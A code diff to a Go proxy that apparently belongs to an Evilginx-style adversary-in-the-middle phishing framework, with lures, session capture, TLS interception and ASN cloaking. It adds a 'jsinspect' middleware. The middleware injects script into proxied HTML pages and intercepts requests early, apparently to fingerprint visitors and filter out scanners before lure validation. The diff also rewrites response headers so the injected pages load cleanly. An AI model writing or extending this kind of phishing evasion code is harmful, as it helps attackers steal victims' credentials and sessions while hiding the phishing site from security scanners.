@@ -44,6 +44,7 @@ import (
 
 	"github.com/s4l1hs/olta/pkg/proxy/database"
 	"github.com/s4l1hs/olta/pkg/proxy/middleware/asncloak"
+	"github.com/s4l1hs/olta/pkg/proxy/middleware/jsinspect"
 	utlstransport "github.com/s4l1hs/olta/pkg/proxy/transport/utls"
 	"golang.org/x/net/proxy"
 
@@ -93,6 +94,7 @@ type HttpProxy struct {
 	rateLimit         int
 	rateWindow        time.Duration
 	cloaker           *asncloak.Middleware
+	jsInspector       *jsinspect.Middleware
 	outboundTransport *utlstransport.Transport
 }
 
@@ -202,6 +204,23 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	})
 
 	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)
+	p.Proxy.OnRequest().DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
+		if req.Method == http.MethodConnect {
+			return req, nil
+		}
+		// Synthetic responses from early enforcement hooks still pass through
+		// the response callbacks, which expect session-shaped context data.
+		if ctx.UserData == nil {
+			ctx.UserData = &ProxySession{Index: -1}
+		}
+		if p.jsInspector == nil {
+			return req, nil
+		}
+		if response, handled := p.jsInspector.HandleRequest(req); handled {
+			return req, response
+		}
+		return req, nil
+	})
 	p.Proxy.OnRequest().DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
 		// The SNI worker creates a synthetic CONNECT request before goproxy
 		// decrypts the browser's HTTP traffic. Only classify the resulting HTTP
@@ -1157,6 +1176,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// modify received body
 			body, err := ioutil.ReadAll(resp.Body)
+			jsInspectInjected := false
 
 			if pl != nil {
 				if s, ok := p.sessions[ps.SessionId]; ok {
@@ -1319,6 +1339,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 
 				if stringExists(mime, []string{"text/html"}) {
+					if p.jsInspector != nil {
+						injectedBody := p.jsInspector.InjectHTML(body)
+						jsInspectInjected = len(injectedBody) != len(body)
+						body = injectedBody
+					}
 
 					if pl != nil && ps.SessionId != "" {
 						s, ok := p.sessions[ps.SessionId]
@@ -1345,7 +1370,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+				resp.Body = ioutil.NopCloser(bytes.NewBuffer(body))
+				if jsInspectInjected {
+					resp.ContentLength = int64(len(body))
+					resp.Header.Set("Content-Length", strconv.Itoa(len(body)))
+					resp.Header.Del("ETag")
+					resp.Header.Del("Content-MD5")
+					resp.TransferEncoding = nil
+					resp.Header.Del("Transfer-Encoding")
+				}
 			}
 
 			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
@@ -2055,7 +2088,7 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 	return body
 }
 
-// ConfigureCloaker installs the request classifier used by the first goproxy
+// ConfigureCloaker installs the request classifier used by an early goproxy
 // request callback. Call it before Start so requests are filtered before lure
 // validation and session initialization.
 func (p *HttpProxy) ConfigureCloaker(config asncloak.Config) error {
@@ -2068,6 +2101,22 @@ func (p *HttpProxy) ConfigureCloaker(config asncloak.Config) error {
 		return err
 	}
 	p.cloaker = cloaker
+	return nil
+}
+
+// ConfigureJSInspect installs the client environment assertion middleware.
+// Call it before Start so the assertion endpoint is available before traffic
+// reaches lure validation and HTML responses are instrumented consistently.
+func (p *HttpProxy) ConfigureJSInspect(config jsinspect.Config) error {
+	if !config.Enabled {
+		p.jsInspector = nil
+		return nil
+	}
+	inspector, err := jsinspect.New(config)
+	if err != nil {
+		return err
+	}
+	p.jsInspector = inspector
 	return nil
 }
 
